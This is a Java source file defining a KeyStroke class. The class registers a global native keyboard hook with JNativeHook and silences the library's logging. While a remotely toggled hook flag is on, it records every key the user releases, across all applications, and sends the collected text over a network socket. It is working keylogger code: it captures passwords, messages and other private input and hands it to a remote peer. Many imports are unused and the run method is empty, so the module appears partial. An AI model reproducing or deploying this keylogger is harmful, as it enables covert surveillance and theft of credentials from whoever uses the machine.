import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.dispatcher.SwingDispatchService;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;
import com.github.kwhat.jnativehook.mouse.NativeMouseEvent;
import com.github.kwhat.jnativehook.mouse.NativeMouseInputListener;
import com.github.kwhat.jnativehook.mouse.NativeMouseListener;
import com.github.kwhat.jnativehook.mouse.NativeMouseMotionListener;
import com.github.kwhat.jnativehook.mouse.NativeMouseWheelEvent;
import com.github.kwhat.jnativehook.mouse.NativeMouseWheelListener;

import javax.swing.*;
import java.awt.*;
import java.awt.event.KeyAdapter;
import java.awt.event.KeyEvent;
import java.awt.KeyEventDispatcher;
import java.awt.event.WindowEvent;
import java.io.BufferedWriter;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.OutputStreamWriter;
import java.util.Calendar;
import java.util.Date;
import java.util.logging.Level;
import java.util.logging.Logger;
import com.sun.jna.Library;
import com.sun.jna.Native;
import com.sun.jna.platform.win32.Kernel32;
import com.sun.jna.platform.win32.WinDef.HMODULE;
import com.sun.jna.platform.win32.WinUser.HHOOK;


import javax.swing.plaf.basic.BasicInternalFrameTitlePane.SystemMenuBar;

import java.lang.ProcessBuilder;
import java.awt.event.*;
import java.io.*;
import java.net.Socket;

public class KeyStroke extends JFrame implements NativeKeyListener, Runnable{
    private JFrame frame;
    private String s="";
    private boolean b_hook, b_unhook,b_shift, b_capslock;
    private String path;
    private DataInputStream dataInputStream;
	private ObjectInputStream objectInputStream;
    private DataOutputStream dataOutputStream;
    Socket socket;
    public KeyStroke(Socket newSocket)
    {
        this.socket = newSocket;
        Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
        logger.setLevel(Level.OFF);
        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException ex) {
            System.err.println("There was a problem registering the native hook.");
            System.err.println(ex.getMessage());
            System.exit(1);
        }
        init();
        GlobalScreen.addNativeKeyListener(this);
        try {
            dataOutputStream = new DataOutputStream(this.socket.getOutputStream());
        } catch (IOException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }
        b_hook=false;
        b_unhook=false;
      
    }
    public boolean getHook()
    {
        return b_hook;
    }
    public boolean getUnhook()
    {
        return b_unhook;
    }
    public void setHook(boolean check)
    {
        b_hook=check;
    }
    public void setUnhook(boolean check)
    {
        b_unhook=check;
    }

    public void init()
    {
        path = System.getProperty("user.dir");
    }
    public void hook()
    {
        b_hook = true;
        b_unhook = false;
    }
    public void unhook() {
        b_hook = false;
        b_unhook = true;
    }
    
    public void print() throws IOException {
        dataOutputStream.writeUTF(s);
        System.out.println(s);
        dataOutputStream.flush();
        s="";
    }

    public void nativeKeyPressed(NativeKeyEvent e) {}
   
    public void nativeKeyReleased(NativeKeyEvent e) {
      
        if (b_hook == true && b_unhook == false) {
           
            String pressed = NativeKeyEvent.getKeyText(e.getKeyCode());
            s += pressed.toLowerCase();
            if(pressed.equals("Enter"))
            {
                s+= "\n";
            }
            
        }
    }

    public void nativeKeyTyped(NativeKeyEvent e) {}
    private void close(BufferedWriter w) {
        try {
            if (w != null) {
                w.close();
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
    @Override
    public void run() {

    }

} 